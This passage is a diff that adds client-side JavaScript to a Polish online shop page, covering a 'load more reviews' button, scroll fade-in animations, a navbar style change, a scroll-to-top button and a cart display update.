+                            <p>Zweryfikowany kupujący - ${review.model}</p>
+                        </div>
+                    </div>
+                `;
+                reviewsGrid.appendChild(reviewElement);
+            }
+            
+            currentExtraReviews = endIndex;
+
+            // Update button text and hide if all reviews are loaded
+            const remainingReviews = additionalReviews.length - currentExtraReviews;
+            if (remainingReviews <= 0) {
+                this.style.display = 'none';
+            } else {
+                this.textContent = `Wyświetl więcej opinii (pozostało ${remainingReviews})`;
+            }
+        });
+
+        // Scroll animations
+        const observerOptions = {
+            threshold: 0.1,
+            rootMargin: '0px 0px -50px 0px'
+        };
+
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.classList.add('visible');
+                }
+            });
+        }, observerOptions);
+
+        // Observe all fade-in elements
+        document.querySelectorAll('.fade-in').forEach(el => {
+            observer.observe(el);
+        });
+
+        // Navbar background change on scroll
+        window.addEventListener('scroll', () => {
+            const nav = document.querySelector('nav');
+            if (window.scrollY > 100) {
+                nav.style.background = 'rgba(10, 10, 10, 0.95)';
+                nav.style.borderBottomColor = 'rgba(255, 255, 255, 0.2)';
+            } else {
+                nav.style.background = 'rgba(10, 10, 10, 0.9)';
+                nav.style.borderBottomColor = 'rgba(255, 255, 255, 0.1)';
+            }
+
+            // Show/hide scroll-to-top button
+            const scrollToTopBtn = document.getElementById('scroll-to-top');
+            if (window.scrollY > 300) { // Show button after scrolling 300px
+                scrollToTopBtn.classList.add('show');
+            } else {
+                scrollToTopBtn.classList.remove('show');
+            }
+        });
+
+        // Scroll to top functionality
+        document.getElementById('scroll-to-top').addEventListener('click', () => {
+            window.scrollTo({
+                top: 0,
+                behavior: 'smooth'
+            });
+        });
+
+        // Initial cart update
+        updateCartDisplay();
     </script>
 </body>
 </html>
